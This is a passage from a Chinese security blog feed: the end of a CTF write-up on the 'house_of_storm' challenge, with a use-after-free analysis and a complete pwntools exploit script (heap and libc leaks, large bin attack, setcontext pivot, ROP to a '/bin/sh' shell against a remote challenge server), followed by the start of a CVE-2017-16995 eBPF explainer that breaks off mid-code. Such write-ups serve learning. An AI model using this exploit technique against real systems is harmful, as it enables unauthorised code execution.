class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体调试后得知这里会将process原本的基地址的内容转移到新的mmap出来的地址上去。不知道为什么如果这样干了gdb就会出现报错无法调试。不过这里只是修改process地址对我们利用没什么影响所以本地调试时可以直接patch掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which one do you want to delete?&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;Which one do you want to delete?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &gt; <span class="number">0xF</span> || !ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error: Invalid index!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是这道题目的漏洞点，很明显的UAF。忘了提一下，这里因为mallopt的缘故无法利用fastbin，虽然我们patch掉，但是如果用fastbin远程就打不通了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>题目给的glibc版本时2.23所以我的第一反应就是通过large bin attack劫持IO_FILE的vtable然后直接执行one_gadget。</p><p>不过实际操作会发现所有的one_gadget都不符合条件，所以我们只能另辟蹊径。</p><p>这里我想到的是通过setcontext进行栈迁移，最后rop拿到shell。不过在puts中调用vtable时使用的寄存器为rax，这里需要有堆地址的寄存器位rdi，所以找到了一个magic gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000065bca: mov rdi, rax; call qword ptr [rax + 0x20];</span><br></pre></td></tr></table></figure><h3 id="综上，exp-3"><a href="#综上，exp-3" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_storm&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./house_of_storm&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What size do you want?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to delete?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to modify?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What do you want to input?&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to see?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x510</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(pop_rdi, bin_sh, system))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">edit(<span class="number">0</span>, flat([libc_base+<span class="number">0x39bfa8</span>]*<span class="number">2</span>, <span class="number">0</span>, libc_base +</span><br><span class="line">     <span class="number">0x39c6f8</span>-<span class="number">0x20</span>, <span class="number">0</span>, libc_base+<span class="number">0x734f0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xC17)\nb*&#x27;+hex(libc_base+0x45226))</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xE10)&#x27;)</span></span><br><span class="line">edit(<span class="number">2</span>, flat([libc_base+<span class="number">0x39bb78</span>]*<span class="number">2</span>,</span><br><span class="line">     [libc_base + <span class="number">0x45226</span>]*<span class="number">3</span>, libc_base+<span class="number">0x734f0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xE10)\nc&#x27;)</span></span><br><span class="line"><span class="comment"># edit(2, flat([libc_base+0x3c4b78]*2, [libc_base +</span></span><br><span class="line"><span class="comment">#      libc.symbols[&#x27;setcontext&#x27;]+53]*3, libc_base+0x6d99a))</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = flat([libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>]</span><br><span class="line">               * <span class="number">5</span>, libc_base+<span class="number">0x65bca</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>) + \</span><br><span class="line">    flat(heap_base+<span class="number">0x520</span>, libc_base+<span class="number">0x205c2</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="comment"># edit(0, flat([libc_base+0x45226]*5, libc_base+0x7c990))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这么多天做星盟的题会发现题目质量非常之高，需要对程序的运行，sandbox绕过机制，shellcode的熟练编写以及在堆题中找适合的gadget，有深刻的理解才可以完成解题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;练题笔记&quot;&gt;&lt;a href=&quot;#练题笔记&quot; class=&quot;headerlink&quot; title=&quot;练题笔记&quot;&gt;&lt;/a&gt;练题笔记&lt;/h2&gt;&lt;p&gt;已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持p</summary>
      
    
    
    
    
    <category term="sandbox" scheme="https://cv196082.gitee.io/tags/sandbox/"/>
    
    <category term="shellcode" scheme="https://cv196082.gitee.io/tags/shellcode/"/>
    
    <category term="__libc_start_main" scheme="https://cv196082.gitee.io/tags/libc-start-main/"/>
    
    <category term="house of storm" scheme="https://cv196082.gitee.io/tags/house-of-storm/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-16995</title>
    <link href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/"/>
    <id>https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/</id>
    <published>2022-10-10T09:07:38.000Z</published>
    <updated>2022-11-22T09:04:51.963Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞最早是由17年12月21号Google Project Zero团队的Jann Horn发现并报告的，编号为CVE-2017-16995。<br><strong>内核影响版本：</strong>Linux Kernel Version 4.14 ~ 4.4 。</p><h2 id="eBPF指令集介绍"><a href="#eBPF指令集介绍" class="headerlink" title="eBPF指令集介绍"></a>eBPF指令集介绍</h2><p>在认识一个新的指令集的第一步就是认识寄存器，在eBPF中存在十一个寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；</span><br><span class="line">R1~R5：一般用于表示内核预设函数的参数；</span><br><span class="line">R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；</span><br><span class="line">R10：只读，用作栈指针(SP)</span><br><span class="line">可理解对应为物理寄存器为：</span><br><span class="line">R0 – rax</span><br><span class="line">    R1 - rdi</span><br><span class="line">    R2 - rsi</span><br><span class="line">    R3 - rdx</span><br><span class="line">    R4 - rcx</span><br><span class="line">    R5 - r8</span><br><span class="line">    R6 - rbx</span><br><span class="line">    R7 - r13</span><br><span class="line">    R8 - r14</span><br><span class="line">    R9 - r15</span><br><span class="line">    R10 – rbp</span><br></pre></td></tr></table></figure><p>对于算数(ALU)和跳转(JMP)指令，8bit的代码字段分为三个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+--------+--------------------+</span><br><span class="line">|   4 bits       |  1 bit |   3 bits           |</span><br><span class="line">| operation code | source | instruction class  |</span><br><span class="line">+----------------+--------+--------------------+</span><br><span class="line">(MSB)                                      (LSB)</span><br></pre></td></tr></table></figure><p>这里最后3bit LSB代表指令类型：    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eBPF classes:</span><br><span class="line"></span><br><span class="line"> BPF_LD    <span class="number">0x00</span></span><br><span class="line"> BPF_LDX   <span class="number">0x01</span></span><br><span class="line"> BPF_ST    <span class="number">0x02</span></span><br><span class="line"> BPF_STX   <span class="number">0x03</span></span><br><span class="line"> BPF_ALU   <span class="number">0x04</span></span><br><span class="line"> BPF_JMP   <span class="number">0x05</span></span><br><span class="line"> BPF_JMP32 <span class="number">0x06</span></span><br><span class="line"> BPF_ALU64 <span class="number">0x07</span></span><br></pre></td></tr></table></figure><p>当<code>BPF_CLASS(code) == BPF_ALU or BPF_JMP</code>时,第四bit编码源操作数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BPF_K     <span class="number">0x00</span> ；代表将立即数作为源操作数</span><br><span class="line">BPF_X     <span class="number">0x08</span> ；代表将‘src_reg’作为源操作数</span><br></pre></td></tr></table></figure><p>前4bit的MSB用来存储操作码：</p><ol><li>如果 BPF_CLASS(code) == BPF_ALU or BPF_ALU64时，操作码会是下面的一个：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_ADD   <span class="number">0x00</span></span><br><span class="line">BPF_SUB   <span class="number">0x10</span></span><br><span class="line">BPF_MUL   <span class="number">0x20</span></span><br><span class="line">BPF_DIV   <span class="number">0x30</span></span><br><span class="line">BPF_OR    <span class="number">0x40</span></span><br><span class="line">BPF_AND   <span class="number">0x50</span></span><br><span class="line">BPF_LSH   <span class="number">0x60</span></span><br><span class="line">BPF_RSH   <span class="number">0x70</span></span><br><span class="line">BPF_NEG   <span class="number">0x80</span></span><br><span class="line">BPF_MOD   <span class="number">0x90</span></span><br><span class="line">BPF_XOR   <span class="number">0xa0</span></span><br><span class="line">BPF_MOV   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: mov reg to reg */</span></span><br><span class="line">BPF_ARSH  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: sign extending shift right */</span></span><br><span class="line">BPF_END   <span class="number">0xd0</span>  <span class="comment">/* eBPF only: endianness conversion */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>如果BPF_CLASS(code) == BPF_JMP or BPF_JMP32时，操作码将会是下面的一个：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_JA    <span class="number">0x00</span>  <span class="comment">/* BPF_JMP only */</span></span><br><span class="line">BPF_JEQ   <span class="number">0x10</span></span><br><span class="line">BPF_JGT   <span class="number">0x20</span></span><br><span class="line">BPF_JGE   <span class="number">0x30</span></span><br><span class="line">BPF_JSET  <span class="number">0x40</span></span><br><span class="line">BPF_JNE   <span class="number">0x50</span>  <span class="comment">/* eBPF only: jump != */</span></span><br><span class="line">BPF_JSGT  <span class="number">0x60</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span></span><br><span class="line">BPF_JSGE  <span class="number">0x70</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span></span><br><span class="line">BPF_CALL  <span class="number">0x80</span>  <span class="comment">/* eBPF BPF_JMP only: function call */</span></span><br><span class="line">BPF_EXIT  <span class="number">0x90</span>  <span class="comment">/* eBPF BPF_JMP only: function return */</span></span><br><span class="line">BPF_JLT   <span class="number">0xa0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JLE   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;=&#x27; */</span></span><br><span class="line">BPF_JSLT  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JSLE  <span class="number">0xd0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;=&#x27; */</span></span><br></pre></td></tr></table></figure><p>比如 <code>BPF_ADD | BPF_X | BPF_ALU</code>这条指令代表32位加法运算，将源寄存器的值加上目的寄存器的值，然后将结果存储到目的寄存器中：<code>dst_reg = (u32) dst_reg + (u32) src_reg;</code></p><p>并且，在eBPF指令集中没有了BPF_RET指令，用<code>BPF_JMP | BPF_EXIT</code>仅代替函数执行完退出，在函数退出之前，eBPF需要将返回值存储在R0中。</p><p>对于加载（LOAD）和存储(STORE)指令，8-bit的代码域分为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+-------------------+</span><br><span class="line">| <span class="number">3</span> bits | <span class="number">2</span> bits |   <span class="number">3</span> bits          |</span><br><span class="line">|  mode  |  size  | instruction <span class="class"><span class="keyword">class</span> |</span></span><br><span class="line"><span class="class">+--------+--------+-------------------+</span></span><br><span class="line"><span class="class">(<span class="title">MSB</span>)                             (<span class="title">LSB</span>)</span></span><br></pre></td></tr></table></figure><p>其中size分别有下面四种类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_W   <span class="number">0x00</span>   ; word <span class="number">4</span> byte</span><br><span class="line">BPF_H   <span class="number">0x08</span>   ; half word <span class="number">2</span> byte</span><br><span class="line">BPF_B   <span class="number">0x10</span>   ; byte </span><br><span class="line">BPF_DW  <span class="number">0x18</span>   ; <span class="keyword">double</span> word <span class="number">8</span> byte</span><br></pre></td></tr></table></figure><p>并且在内核中，每一条指令的信息都储存在bpf_insn结构体中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="eBPF代码加载执行流程-amp-检查分析"><a href="#eBPF代码加载执行流程-amp-检查分析" class="headerlink" title="eBPF代码加载执行流程 &amp; 检查分析"></a>eBPF代码加载执行流程 &amp; 检查分析</h2><h3 id="加载执行流程"><a href="#加载执行流程" class="headerlink" title="加载执行流程"></a>加载执行流程</h3><p>用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件来（如往socket写数据）来触发内核执行用户提供的eBPF代码。eBPF模块可以让用户加载数据包过滤代码（eBPF代码）进入内核，在收到数据包时触发eBPF代码执行。可以编写一个简单的用户数据包过滤程序来触发执行eBPF代码，具体流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；创建全局变量<span class="built_in">map</span>结构体，内核态用户态都可以访问。</span><br><span class="line">* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；将用户态的BPF代码注入到内核，并对代码进行检查，并模拟执行。</span><br><span class="line">    * <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span> ；判断过滤模式</span></span><br><span class="line"><span class="function">        * <span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function">            * <span class="title">check_cfg</span><span class="params">(env)</span></span>; 第一轮检查，检查是否存在环路</span><br><span class="line">            * do_check(env);  第二轮检查，详细扫描BPF代码的运行过程，跟踪分析寄存器和堆栈，检查是否有不符合规则的情况出现</span><br><span class="line">    * <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)；运行BPF指令，最后真正运行的的函数。</span><br><span class="line">* setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd))；将eBPF与特定的事件绑定，在收到数据包时触发eBPF代码执行。</span><br></pre></td></tr></table></figure><h3 id="检查分析"><a href="#检查分析" class="headerlink" title="检查分析"></a>检查分析</h3><p>根据上述流程我们可以看到我们将BPF代码注入到内核中是发生在第二步中的，执行的函数为：<code>bpf_prog_load</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">  <span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">  <span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">                        <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">  is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> 